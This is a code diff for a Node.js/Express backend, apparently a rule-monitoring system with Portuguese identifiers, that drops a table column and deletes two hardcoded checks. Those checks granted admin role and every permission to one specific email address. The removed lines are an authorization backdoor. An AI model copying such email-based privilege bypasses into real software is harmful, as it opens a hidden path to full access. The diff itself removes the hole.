@@ -56,7 +56,7 @@ const TABLES = {
   permissoes_roles: { name: "permissoes_roles", pk: "id", cols: ["role", "permissao_id", "ativo"] },
   permissoes_usuarios: { name: "permissoes_usuarios", pk: "id", cols: ["usuario_id", "permissao_id", "ativo", "is_customizado"] },
   usuarios_roles: { name: "usuarios_roles", pk: "id", cols: ["id_usuario", "role_name"] },
-  execucoes_regras: { name: "execucoes_regras", pk: "id_execucao", cols: ["id_regra", "data_inicio", "data_fim", "sucesso", "resultado_json", "linhas_afetadas", "erro_mensagem", "valor_retornado"] },
+  execucoes_regras: { name: "execucoes_regras", pk: "id_execucao", cols: ["id_regra", "data_inicio", "data_fim", "sucesso", "resultado_json", "linhas_afetadas", "erro_mensagem"] },
   incidentes: { name: "incidentes", pk: "id_incidente", cols: ["id_regra", "status", "prioridade", "detalhes", "comentario_resolucao", "data_abertura", "data_ultima_ocorrencia", "id_execucao_origem"] },
   eventos_incidente: { name: "eventos_incidente", pk: "id", cols: ["id_incidente", "tipo", "usuario", "detalhes", "timestamp"] },
   fila_runner: { name: "fila_runner", pk: "id", cols: ["id_regra", "status", "agendado_para"] },
@@ -109,11 +109,6 @@ app.get("/check-user", async (req, res) => {
   try {
     const result = await client.query("SELECT * FROM usuarios WHERE firebase_uid = $1", [uid]);
     if (result.rows.length === 0) return res.status(404).json({ error: "Não encontrado" });
-
-
-    if (result.rows[0].email === 'queroqueromonitor@gmail.com') {
-      result.rows[0].role = 'admin';
-    }
     res.json(result.rows[0]);
   } catch (e) { res.status(500).json({ error: e.message }); }
   finally { client.release(); }
@@ -251,8 +246,6 @@ async function checarPermissaoUsuario(client, userId, codigoPermissao) {
   try {
     const userRes = await client.query("SELECT role, email FROM usuarios WHERE id = $1", [userId]);
     if (userRes.rows.length === 0) return false;
-
-    if (userRes.rows[0].email === 'queroqueromonitor@gmail.com') return true;
 
     const userRole = userRes.rows[0].role;
 
